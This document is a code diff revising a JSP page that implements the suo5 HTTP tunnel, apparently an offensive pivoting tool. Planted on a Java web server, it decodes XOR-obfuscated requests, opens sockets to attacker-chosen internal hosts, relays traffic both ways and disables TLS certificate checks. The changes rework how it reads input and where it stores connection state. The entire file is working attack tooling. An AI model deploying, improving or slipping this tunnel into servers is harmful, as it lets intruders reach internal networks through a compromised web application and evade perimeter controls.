@@ -1,7 +1,8 @@
 <%@ page import="java.nio.ByteBuffer" %><%@ page import="java.io.*" %><%@ page import="java.net.*" %><%@ page import="java.security.cert.X509Certificate" %><%@ page import="java.security.cert.CertificateException" %><%@ page import="javax.net.ssl.*" %><%@ page import="java.util.*" %><%!
     public static class Suo5 implements Runnable, HostnameVerifier, X509TrustManager {
 
-        static HashMap addrs = collectAddr();
+        public static HashMap addrs = collectAddr();
+        public static HashMap ctx = new HashMap();
 
         InputStream gInStream;
         OutputStream gOutStream;
@@ -44,26 +45,20 @@
             }
         }
 
-        public void readInputStreamWithTimeout(InputStream is, byte[] b, int timeoutMillis) throws IOException, InterruptedException {
+        public void readFull(InputStream is, byte[] b) throws IOException, InterruptedException {
             int bufferOffset = 0;
-            long maxTimeMillis = new Date().getTime() + timeoutMillis;
-            while (new Date().getTime() < maxTimeMillis && bufferOffset < b.length) {
+            while (bufferOffset < b.length) {
                 int readLength = b.length - bufferOffset;
-                if (is.available() < readLength) {
-                    readLength = is.available();
-                }
-                // can alternatively use bufferedReader, guarded by isReady():
                 int readResult = is.read(b, bufferOffset, readLength);
                 if (readResult == -1) break;
                 bufferOffset += readResult;
-                Thread.sleep(200);
             }
         }
 
         public void tryFullDuplex(HttpServletRequest request, HttpServletResponse response) throws IOException, InterruptedException {
             InputStream in = request.getInputStream();
             byte[] data = new byte[32];
-            readInputStreamWithTimeout(in, data, 2000);
+            readFull(in, data);
             OutputStream out = response.getOutputStream();
             out.write(data);
             out.flush();
@@ -112,6 +107,19 @@
                     ((bytes[3] & 0xFF) << 0);
         }
 
+        // 并发安全
+        synchronized void put(String k, Object v) {
+            ctx.put(k, v);
+        }
+
+        synchronized Object get(String k) {
+            return ctx.get(k);
+        }
+
+        synchronized Object remove(String k) {
+            return ctx.remove(k);
+        }
+
         byte[] copyOfRange(byte[] original, int from, int to) {
             int newLength = to - from;
             if (newLength < 0) {
@@ -154,9 +162,8 @@
         }
 
         private HashMap unmarshal(InputStream in) throws Exception {
-            DataInputStream reader = new DataInputStream(in);
             byte[] header = new byte[4 + 1]; // size and datatype
-            reader.readFully(header);
+            readFull(in, header);
             // read full
             ByteBuffer bb = ByteBuffer.wrap(header);
             int len = bb.getInt();
@@ -165,7 +172,7 @@
                 throw new IOException("invalid len");
             }
             byte[] bs = new byte[len];
-            reader.readFully(bs);
+            readFull(in, bs);
             for (int i = 0; i < bs.length; i++) {
                 bs[i] = (byte) (bs[i] ^ x);
             }
@@ -207,16 +214,15 @@
 
         private void processDataBio(HttpServletRequest request, HttpServletResponse resp) throws Exception {
             final InputStream reqInputStream = request.getInputStream();
-            final BufferedInputStream reqReader = new BufferedInputStream(reqInputStream);
             HashMap dataMap;
-            dataMap = unmarshal(reqReader);
+            dataMap = unmarshal(reqInputStream);
 
             byte[] action = (byte[]) dataMap.get("ac");
             if (action.length != 1 || action[0] != 0x00) {
                 resp.setStatus(403);
                 return;
             }
-            resp.setBufferSize(8 * 1024);
+            resp.setBufferSize(512);
             final OutputStream respOutStream = resp.getOutputStream();
 
             // 0x00 create socket
@@ -236,6 +242,7 @@
 
             respOutStream.write(marshal(newStatus((byte) 0x00)));
             respOutStream.flush();
+            resp.flushBuffer();
 
             final OutputStream scOutStream = sc.getOutputStream();
             final InputStream scInStream = sc.getInputStream();
@@ -245,7 +252,7 @@
                 Suo5 p = new Suo5(scInStream, respOutStream);
                 t = new Thread(p);
                 t.start();
-                readReq(reqReader, scOutStream);
+                readReq(reqInputStream, scOutStream);
             } catch (Exception e) {
 //                System.out.printf("pipe error, %s\n", e);
             } finally {
@@ -274,7 +281,7 @@
             }
         }
 
-        private void readReq(BufferedInputStream bufInputStream, OutputStream socketOutStream) throws Exception {
+        private void readReq(InputStream bufInputStream, OutputStream socketOutStream) throws Exception {
             while (true) {
                 HashMap dataMap;
                 dataMap = unmarshal(bufInputStream);
@@ -303,7 +310,6 @@
         private void processDataUnary(HttpServletRequest request, HttpServletResponse resp) throws
                 Exception {
             InputStream is = request.getInputStream();
-            ServletContext ctx = request.getSession().getServletContext();
             BufferedInputStream reader = new BufferedInputStream(is);
             HashMap dataMap;
             dataMap = unmarshal(reader);
@@ -337,24 +343,26 @@
                 return;
             }
 
-            resp.setBufferSize(8 * 1024);
+            resp.setBufferSize(512);
             OutputStream respOutStream = resp.getOutputStream();
             if (action[0] == 0x02) {
-                OutputStream scOutStream = (OutputStream) ctx.getAttribute(clientId);
-                if (scOutStream != null) {
-                    scOutStream.close();
-                }
+                Object o = this.get(clientId);
+                if (o == null) return;
+                OutputStream scOutStream = (OutputStream) o;
+                scOutStream.close();
                 return;
             } else if (action[0] == 0x01) {
-                OutputStream scOutStream = (OutputStream) ctx.getAttribute(clientId);
-                if (scOutStream == null) {
+                Object o = this.get(clientId);
+                if (o == null) {
                     respOutStream.write(marshal(newDel()));
                     respOutStream.flush();
                     respOutStream.close();
                     return;
                 }
+                OutputStream scOutStream = (OutputStream) o;
                 byte[] data = (byte[]) dataMap.get("dt");
                 if (data.length != 0) {
+//                    System.out.printf("write datat to scOut, length: %d\n", data.length);
                     scOutStream.write(data);
                     scOutStream.flush();
                 }
@@ -385,11 +393,15 @@
                     sc = new Socket();
                     sc.connect(new InetSocketAddress(host, port), 5000);
                     readFrom = sc.getInputStream();
-                    ctx.setAttribute(clientId, sc.getOutputStream());
+                    this.put(clientId, sc.getOutputStream());
                     respOutStream.write(marshal(newStatus((byte) 0x00)));
                     respOutStream.flush();
+                    resp.flushBuffer();
                 } catch (Exception e) {
-                    ctx.removeAttribute(clientId);
+//                    System.out.printf("connect error %s\n", e);
+//                    e.printStackTrace();
+
+                    this.remove(clientId);
                     respOutStream.write(marshal(newStatus((byte) 0x01)));
                     respOutStream.flush();
                     respOutStream.close();
@@ -400,8 +412,7 @@
             try {
                 readSocket(readFrom, respOutStream, !needRedirect);
             } catch (Exception e) {
-//                System.out.printf("pipe error, %s\n", e);
-//                e.printStackTrace();
+                e.printStackTrace();
             } finally {
                 if (sc != null) {
                     sc.close();
@@ -410,7 +421,7 @@
                     conn.disconnect();
                 }
                 respOutStream.close();
-                ctx.removeAttribute(clientId);
+                this.remove(clientId);
             }
         }
 
@@ -475,9 +486,9 @@
             // ref: https://github.com/L-codes/Neo-reGeorg/blob/master/templates/NeoreGeorg.java
             if (HttpsURLConnection.class.isInstance(conn)) {
                 ((HttpsURLConnection) conn).setHostnameVerifier(this);
-                SSLContext ctx = SSLContext.getInstance("SSL");
-                ctx.init(null, new TrustManager[]{this}, null);
-                ((HttpsURLConnection) conn).setSSLSocketFactory(ctx.getSocketFactory());
+                SSLContext sslCtx = SSLContext.getInstance("SSL");
+                sslCtx.init(null, new TrustManager[]{this}, null);
+                ((HttpsURLConnection) conn).setSSLSocketFactory(sslCtx.getSocketFactory());
             }
 
             Enumeration headers = request.getHeaderNames();
@@ -513,6 +524,7 @@
     o.process(request, response);
     try {
         out.clear();
-    } catch (Exception e)  {}
+    } catch (Exception e) {
+    }
     out = pageContext.pushBody();
 %>
